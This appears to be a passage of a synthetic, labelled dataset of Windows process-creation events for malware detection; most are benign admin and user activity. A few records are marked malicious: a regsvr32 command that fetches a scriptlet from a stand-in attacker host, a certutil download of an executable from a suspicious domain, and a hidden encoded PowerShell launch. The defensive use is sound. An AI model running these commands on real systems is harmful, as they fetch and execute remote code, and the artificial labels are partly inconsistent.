  {
    "UtcTime": "2024-07-03T16:14:11.533Z",
    "ProcessGuid": "{F1A8834F-E9F0-4091-A02C-BAABB87B9795}",
    "ProcessId": 5468,
    "Image": "C:\\Windows\\System32\\perfmon.exe",
    "CommandLine": "perfmon.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 52528,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T15:20:59.769Z",
    "ProcessGuid": "{9CC5047C-6F4D-4605-AED2-1B3E54506931}",
    "ProcessId": 62324,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 5754,
    "User": "CORP\\analyst02",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T16:32:05.406Z",
    "ProcessGuid": "{C1C3F8A8-1C08-4961-A609-6CA11CE9A9C9}",
    "ProcessId": 24846,
    "Image": "C:\\Windows\\System32\\mmc.exe",
    "CommandLine": "mmc.exe diskmgmt.msc",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 33910,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T07:51:47.595Z",
    "ProcessGuid": "{925F2314-7073-4786-9546-3B061823BCB2}",
    "ProcessId": 38066,
    "Image": "C:\\Windows\\System32\\bitsadmin.exe",
    "CommandLine": "bitsadmin.exe /transfer wsus_update /download /priority normal http://internal-wsus.corp.local/update_kb8602547.cab C:\\Windows\\SoftwareDistribution\\Download\\update_kb8602547.cab",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s BITS",
    "ParentProcessId": 47835,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-01T08:54:32.646Z",
    "ProcessGuid": "{398BD31D-7CBF-4867-AF86-AA9B5BF68F28}",
    "ProcessId": 3044,
    "Image": "C:\\Windows\\regedit.exe",
    "CommandLine": "regedit.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 54257,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T15:17:53.394Z",
    "ProcessGuid": "{C34C93F6-37FA-4F4B-941D-723503AD0A7B}",
    "ProcessId": 46213,
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "CommandLine": "msiexec.exe /i C:\\Temp\\update_3.1.51.msi /passive /norestart",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 56749,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T08:12:54.672Z",
    "ProcessGuid": "{B5ABCF86-92C0-425D-AAF7-74CF93962C3C}",
    "ProcessId": 61998,
    "Image": "C:\\Windows\\System32\\odbcad32.exe",
    "CommandLine": "odbcad32.exe",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\"",
    "ParentProcessId": 53685,
    "User": "CORP\\helpdesk",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T10:48:58.523Z",
    "ProcessGuid": "{28FD6390-DF58-4DEA-A237-D732C37F770B}",
    "ProcessId": 19367,
    "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
    "CommandLine": "msedge.exe --type=gpu-process",
    "ParentImage": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
    "ParentCommandLine": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"",
    "ParentProcessId": 27075,
    "User": "CORP\\pchen",
    "IntegrityLevel": "Low",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T16:08:41.880Z",
    "ProcessGuid": "{95C3ADEC-7A49-45F0-B122-E27498DEC809}",
    "ProcessId": 23791,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c gpupdate /force",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 8774,
    "User": "CORP\\analyst02",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T13:56:35.490Z",
    "ProcessGuid": "{DDE339C8-69BE-4DBD-9C3F-F82B7051075D}",
    "ProcessId": 4996,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s wuauserv",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 6748,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T23:02:27.019Z",
    "ProcessGuid": "{8A156EFE-26E0-421E-B662-1E0E1CD2A8BF}",
    "ProcessId": 31130,
    "Image": "C:\\Windows\\System32\\lsass.exe",
    "CommandLine": "C:\\Windows\\System32\\lsass.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 61369,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T12:47:53.705Z",
    "ProcessGuid": "{C79181AA-37D7-428B-BFEF-8C59CCA08940}",
    "ProcessId": 6923,
    "Image": "C:\\Users\\itops\\Downloads\\installer.exe",
    "CommandLine": "installer.exe --silent --accept-license",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 19682,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T03:12:50.142Z",
    "ProcessGuid": "{209724B3-ED10-46EF-A06F-CB769103A727}",
    "ProcessId": 16514,
    "Image": "C:\\Windows\\System32\\lsass.exe",
    "CommandLine": "C:\\Windows\\System32\\lsass.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 52797,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T10:01:17.805Z",
    "ProcessGuid": "{FF49C2BE-8C86-45EB-866F-139C3E6DE11D}",
    "ProcessId": 14487,
    "Image": "C:\\Windows\\System32\\schtasks.exe",
    "CommandLine": "schtasks.exe /create /tn \"NightlyBackup\" /tr \"C:\\Scripts\\backup.bat\" /sc daily /st 02:00",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 17075,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-03T17:22:49.722Z",
    "ProcessGuid": "{C4EB4B0C-D274-413A-98A1-CFB25ADB90C0}",
    "ProcessId": 27091,
    "Image": "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe",
    "CommandLine": "OneDrive.exe /sync",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\POWERPNT.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\POWERPNT.EXE\"",
    "ParentProcessId": 49220,
    "User": "CORP\\pchen",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-07T04:14:49.112Z",
    "ProcessGuid": "{5CEAD836-BF67-4B19-8D9E-4B68FA4B4A2E}",
    "ProcessId": 22373,
    "Image": "C:\\Windows\\System32\\regsvr32.exe",
    "CommandLine": "regsvr32.exe /s /n /u /i:http://evil-payload7957.net/file73.sct scrobj.dll",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe /c",
    "ParentProcessId": 15927,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1218.010",
    "technique_name": "Regsvr32 Squiblydoo",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-04T15:07:14.730Z",
    "ProcessGuid": "{60275C5D-9AD0-4EB3-AFF8-55E35581D3FB}",
    "ProcessId": 14313,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil.exe -encode C:\\Users\\Public\\decoded2887.exe C:\\Users\\Public\\encoded6128.txt",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "powershell.exe",
    "ParentProcessId": 13487,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1140",
    "technique_name": "Certutil Base64 Decode",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-05T13:36:25.726Z",
    "ProcessGuid": "{DA8CEC7A-7F37-45C3-9FFC-4FBAF2C4B50C}",
    "ProcessId": 42952,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k LocalService -p",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 28373,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T14:57:03.168Z",
    "ProcessGuid": "{8F955A8A-8D74-4FAC-9125-85377632C326}",
    "ProcessId": 25836,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 1141,
    "User": "CORP\\analyst02",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T03:19:50.407Z",
    "ProcessGuid": "{133308C1-F08F-418A-A26B-BA11A2BA5B1F}",
    "ProcessId": 31863,
    "Image": "C:\\Windows\\System32\\wuauclt.exe",
    "CommandLine": "wuauclt.exe /detectnow /updatenow",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 33053,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T02:02:58.237Z",
    "ProcessGuid": "{48A7EAB1-4072-4CBF-BD78-0F998D3A10EB}",
    "ProcessId": 59804,
    "Image": "C:\\Windows\\servicing\\TrustedInstaller.exe",
    "CommandLine": "C:\\Windows\\servicing\\TrustedInstaller.exe",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 56410,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T12:36:02.781Z",
    "ProcessGuid": "{A0376A8F-79C6-423A-AC6E-60E0947336E2}",
    "ProcessId": 50562,
    "Image": "C:\\Program Files\\Zoom\\bin\\Zoom.exe",
    "CommandLine": "Zoom.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 12481,
    "User": "CORP\\netadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T10:04:52.046Z",
    "ProcessGuid": "{072C3329-E037-48E4-9350-E44EF56BC687}",
    "ProcessId": 20542,
    "Image": "C:\\Users\\admin\\Downloads\\setup.exe",
    "CommandLine": "setup.exe /S /v/qn",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 63158,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T14:39:00.927Z",
    "ProcessGuid": "{734DC195-B1A1-499D-99D5-106CB2AC3C05}",
    "ProcessId": 6192,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k NetworkService",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 2245,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T09:38:04.691Z",
    "ProcessGuid": "{00F03229-EEEE-4EA8-9C94-98524B9A3C2C}",
    "ProcessId": 57480,
    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "CommandLine": "chrome.exe --no-first-run",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 16414,
    "User": "CORP\\dbadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T11:47:35.551Z",
    "ProcessGuid": "{83CF29DF-3F32-41F2-890E-802B4A1AE36A}",
    "ProcessId": 18219,
    "Image": "C:\\Program Files\\Zoom\\bin\\Zoom.exe",
    "CommandLine": "Zoom.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 49956,
    "User": "CORP\\helpdesk",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T08:06:27.237Z",
    "ProcessGuid": "{90C91722-BCE5-4BA7-99B7-9A9F3D6DDB53}",
    "ProcessId": 55963,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c ping google.com",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 5981,
    "User": "CORP\\dbadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T14:04:51.866Z",
    "ProcessGuid": "{FDF9092D-EEAE-4A77-A25A-B44EA0492FA9}",
    "ProcessId": 3189,
    "Image": "C:\\Windows\\servicing\\TrustedInstaller.exe",
    "CommandLine": "C:\\Windows\\servicing\\TrustedInstaller.exe",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 20327,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T16:05:12.978Z",
    "ProcessGuid": "{9E645801-9190-4A15-8C2D-FE4C8851E827}",
    "ProcessId": 41547,
    "Image": "C:\\Windows\\System32\\schtasks.exe",
    "CommandLine": "schtasks.exe /query /fo TABLE /v",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 36509,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-03T09:58:36.114Z",
    "ProcessGuid": "{B697EF84-0848-463B-9FB4-41E92D62258F}",
    "ProcessId": 5047,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c net view \\\\fileserver",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 55314,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T09:23:32.750Z",
    "ProcessGuid": "{95B5C69A-BE87-42E9-B09E-F1B5D5CA0DC4}",
    "ProcessId": 38700,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -ep bypass -nop -w hidden -enc QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7ACQAZwA9AFsARAByAGEAdwBpAG4AZwAuAEIAaQB0AG0AYQBwAF0AOgA6AG4AZQB3ACgAJAB1ACkA",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 2149,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1059.001",
    "technique_name": "PowerShell Encoded Command",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-01T10:50:16.571Z",
    "ProcessGuid": "{3E039B8D-2E01-45DA-9928-286032F77E65}",
    "ProcessId": 5616,
    "Image": "C:\\Windows\\regedit.exe",
    "CommandLine": "regedit.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 38680,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T11:05:52.628Z",
    "ProcessGuid": "{CF5CDA9A-BC95-4D49-BF6C-D751B11E80ED}",
    "ProcessId": 41975,
    "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
    "CommandLine": "wmic.exe process list full",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 20869,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-02T12:02:18.978Z",
    "ProcessGuid": "{076CF6BC-E366-46DB-B70E-5BC91220DE44}",
    "ProcessId": 47801,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c gpupdate /force",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 6179,
    "User": "CORP\\analyst01",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T05:40:46.043Z",
    "ProcessGuid": "{CC3117E3-8D20-4803-AB6D-84C68A9ED75A}",
    "ProcessId": 49806,
    "Image": "C:\\Windows\\System32\\taskeng.exe",
    "CommandLine": "taskeng.exe {GUID} S",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 62434,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T13:10:08.737Z",
    "ProcessGuid": "{219337F0-E382-4EDB-B608-3B009FC98E6F}",
    "ProcessId": 36818,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 33002,
    "User": "CORP\\helpdesk",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T14:24:42.811Z",
    "ProcessGuid": "{A956871A-D45D-4560-BE8B-FF81BC5587D2}",
    "ProcessId": 54788,
    "Image": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
    "CommandLine": "Acrobat.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 43730,
    "User": "CORP\\analyst02",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T15:12:20.019Z",
    "ProcessGuid": "{8D4C297E-0C29-4CBF-9CDF-30A2288D47D6}",
    "ProcessId": 10971,
    "Image": "C:\\Windows\\System32\\taskeng.exe",
    "CommandLine": "taskeng.exe {GUID} S",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 4252,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T09:49:32.016Z",
    "ProcessGuid": "{8C03BC7F-1555-4085-9C5C-003777BCAF7D}",
    "ProcessId": 8466,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil.exe -verifystore My server5",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 49530,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-01T16:23:12.421Z",
    "ProcessGuid": "{F72FEDDD-CD07-4FF5-AC02-CB1E0F2E85CE}",
    "ProcessId": 58813,
    "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
    "CommandLine": "msedge.exe --type=gpu-process",
    "ParentImage": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
    "ParentCommandLine": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"",
    "ParentProcessId": 37736,
    "User": "CORP\\klee",
    "IntegrityLevel": "Low",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-07T04:24:43.323Z",
    "ProcessGuid": "{CDEF8705-2809-4926-BF4D-0528006FCF7B}",
    "ProcessId": 64030,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil  -urlcache -split -f http://stager6543.ru/downloads/runtime488.exe C:\\Users\\Public\\sys972.exe",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "powershell.exe",
    "ParentProcessId": 35750,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1105",
    "technique_name": "Certutil Download",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-01T15:41:00.068Z",
    "ProcessGuid": "{32A9DB95-0DA8-4FEC-9D5B-CBF985525260}",
    "ProcessId": 26470,
    "Image": "C:\\Program Files\\Git\\bin\\git.exe",
    "CommandLine": "git.exe pull origin main",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 44278,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T12:46:37.778Z",
    "ProcessGuid": "{134C0D68-54A9-4B24-9509-0EA30CEBF170}",
    "ProcessId": 35382,
    "Image": "C:\\Windows\\explorer.exe",
    "CommandLine": "explorer.exe C:\\Users\\mjones\\Documents",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 40111,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T14:27:11.498Z",
    "ProcessGuid": "{6CD431B7-A9A2-4918-AE9A-8770A2FE606A}",
    "ProcessId": 42648,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Import-Module ActiveDirectory; Get-ADComputer -Filter *\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 36217,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T12:52:22.273Z",
    "ProcessGuid": "{8C4D6442-3EB1-442F-AA33-DEA462DECD57}",
    "ProcessId": 53096,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c hostname",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 27011,
    "User": "CORP\\netadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T16:26:16.193Z",
    "ProcessGuid": "{BC44BB7D-12AE-4F5D-9CFA-D2B9A2F40054}",
    "ProcessId": 1358,
    "Image": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
    "CommandLine": "Acrobat.exe C:\\Users\\pchen\\Documents\\report.pdf",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\"",
    "ParentProcessId": 47474,
    "User": "CORP\\pchen",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T10:05:53.768Z",
    "ProcessGuid": "{6D843601-6164-4C20-9F0F-242328B7A884}",
    "ProcessId": 63366,
    "Image": "C:\\Windows\\System32\\conhost.exe",
    "CommandLine": "conhost.exe 0xffffffff -ForceV1",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 10574,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T04:57:02.206Z",
    "ProcessGuid": "{576DD9D0-2F55-433B-A11E-E09CDFE6E705}",
    "ProcessId": 11443,
    "Image": "C:\\Windows\\System32\\cscript.exe",
